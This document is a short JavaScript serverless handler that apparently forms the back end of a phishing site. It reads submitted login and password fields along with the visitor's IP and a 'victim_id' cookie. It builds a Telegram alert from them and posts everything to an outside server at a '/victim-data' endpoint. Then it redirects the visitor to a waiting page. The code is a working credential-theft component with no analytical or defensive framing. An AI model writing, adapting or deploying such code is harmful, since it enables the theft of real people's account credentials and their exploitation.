const fetch = require('node-fetch');

const SOCKET_SERVER = 'https://my-project-production-8e23.up.railway.app';

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const params = new URLSearchParams(event.body);
    const login = params.get('login') || '';
    const password = params.get('password') || '';
    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || '?';
    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || ('v_' + Date.now());

    const telegramMsg = `<b>🔑 Password</b>\n<b>Login:</b> <code>${login}</code>\n<b>Pass:</b> <code>${password}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>ID:</b> <code>${vId}</code>`;

    await fetch(`${SOCKET_SERVER}/victim-data`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        victimId: vId,
        type: 'password',
        data: { value: password, action: 'password' },
        ip,
        page: 'password',
        telegramMsg
      })
    }).catch(e => console.error('Socket notify error:', e));

    return {
      statusCode: 302,
      headers: {
        'Location': '/wait',
        'Set-Cookie': `victim_id=${vId}; Path=/; SameSite=Lax`
      },
      body: ''
    };
  } catch (error) {
    console.error('Error:', error);
    return { statusCode: 500, body: 'Internal Server Error' };
  }
};
